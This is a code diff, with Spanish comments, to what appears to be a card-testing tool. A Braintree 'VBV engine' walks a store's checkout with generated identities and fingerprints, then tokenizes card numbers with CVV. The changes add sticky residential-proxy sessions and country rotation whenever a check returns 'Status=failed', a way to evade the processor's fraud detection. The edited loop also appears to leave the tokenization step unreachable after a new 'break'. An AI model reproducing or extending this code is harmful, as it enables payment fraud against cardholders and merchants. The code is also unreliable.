@@ -101,23 +101,26 @@ class ProxyManager:
         self._cfg = cfg
         self._current_country_idx = 0
         self._lock = threading.Lock()
+        self._session_id = uuid.uuid4().hex  # sticky session for IP persistence
 
-    def get_proxy(self) -> Dict[str, str]:
+    def get_proxy(self, country_override: str = None) -> Dict[str, str]:
         with self._lock:
             countries = self._cfg.get("proxy", "country_rotation", default=["US"])
-            country = countries[self._current_country_idx % len(countries)]
-            self._current_country_idx += 1
+            if country_override:
+                country = country_override
+            else:
+                country = countries[self._current_country_idx % len(countries)]
+                self._current_country_idx += 1
 
         apify_cfg = self._cfg.get("proxy", "apify")
         if apify_cfg and apify_cfg.get("enabled"):
-            # Leer password desde variable de entorno primero, luego del config
             pwd_env = apify_cfg.get("password_env", "")
             password = os.environ.get(pwd_env, "") if pwd_env else ""
             if not password:
                 password = apify_cfg.get("password", "")
             url = apify_cfg["url_template"].format(
                 country=country,
-                session=uuid.uuid4().hex,
+                session=self._session_id,
                 password=password
             )
             return {"http": url, "https": url}
@@ -128,6 +131,12 @@ class ProxyManager:
             return {"http": proxy, "https": proxy}
 
         return {}
+
+    def rotate_country(self):
+        """Rotar al siguiente pais en la lista."""
+        with self._lock:
+            self._current_country_idx += 1
+            self._session_id = uuid.uuid4().hex  # nueva sesion para nuevo pais
 
 
 class ProxyValidator:
@@ -771,61 +780,72 @@ class BraintreeVBVEngine:
         retry_on = self._cfg.get("retry", "retry_on", default=[])
         retry_delay = self._cfg.get("timing", "retry_delay", default=3.0)
         card_bin = card[:6]
+        max_country_rotations = 3  # max cambios de pais antes de rendirse
 
         for attempt in range(1, max_retries + 1):
-            sess, fp, identity = self._new_session()
-            email = identity["email"]
+            for country_try in range(max_country_rotations):
+                sess, fp, identity = self._new_session()
+                email = identity["email"]
 
-            # Step 1
-            err = self._step_product(sess, fp)
-            if err:
-                if attempt < max_retries and any(e in err for e in retry_on):
-                    time.sleep(retry_delay)
-                    continue
-                return err
-            self._delay()
+                # Step 1
+                err = self._step_product(sess, fp)
+                if err:
+                    if attempt < max_retries and any(e in err for e in retry_on):
+                        time.sleep(retry_delay)
+                        continue
+                    return err
+                self._delay()
 
-            # Step 2
-            err, cart_id, cart_total = self._step_cart(sess, fp)
-            if err:
-                if attempt < max_retries and any(e in err for e in retry_on):
-                    time.sleep(retry_delay)
-                    continue
-                return err
-            self._delay()
+                # Step 2
+                err, cart_id, cart_total = self._step_cart(sess, fp)
+                if err:
+                    if attempt < max_retries and any(e in err for e in retry_on):
+                        time.sleep(retry_delay)
+                        continue
+                    return err
+                self._delay()
 
-            # Step 3
-            err = self._step_email(sess, fp, cart_id, email)
-            if err:
-                return err
-            self._delay()
+                # Step 3
+                err = self._step_email(sess, fp, cart_id, email)
+                if err:
+                    return err
+                self._delay()
 
-            # Step 4
-            err = self._step_methods(sess, fp, cart_id, cart_total)
-            if err:
-                return err
-            self._delay()
+                # Step 4
+                err = self._step_methods(sess, fp, cart_id, cart_total)
+                if err:
+                    return err
+                self._delay()
 
-            # Step 5
-            err = self._step_select(sess, fp, cart_id, email)
-            if err:
-                return err
-            self._delay()
+                # Step 5
+                err = self._step_select(sess, fp, cart_id, email)
+                if err:
+                    return err
+                self._delay()
 
-            # Step 6
-            err = self._step_details(sess, fp, cart_id, identity)
-            if err:
-                return err
-            self._delay()
+                # Step 6
+                err = self._step_details(sess, fp, cart_id, identity)
+                if err:
+                    return err
+                self._delay()
 
-            # Step 7
-            err, bt_info = self._step_session(sess, fp, cart_id, cart_total)
-            if err:
-                if attempt < max_retries and any(e in err for e in retry_on):
-                    time.sleep(retry_delay)
-                    continue
-                return err
-            self._delay()
+                # Step 7
+                err, bt_info = self._step_session(sess, fp, cart_id, cart_total)
+                if err:
+                    # Si es Status=failed, rotar pais y reintentar
+                    if "Status=failed" in err and country_try < max_country_rotations - 1:
+                        self._proxy_mgr.rotate_country()
+                        time.sleep(retry_delay)
+                        continue
+                    if attempt < max_retries and any(e in err for e in retry_on):
+                        time.sleep(retry_delay)
+                        continue
+                    return err
+                self._delay()
+                break  # salir del bucle de paises si todo ok
+            else:
+                continue  # si se acabaron los paises, reintentar
+            break  # salir del bucle de reintentos si todo ok
 
             # Step 8
             err, nonce = self._step_tokenize(sess, fp, bt_info, card, mm, yy, cvv, identity)
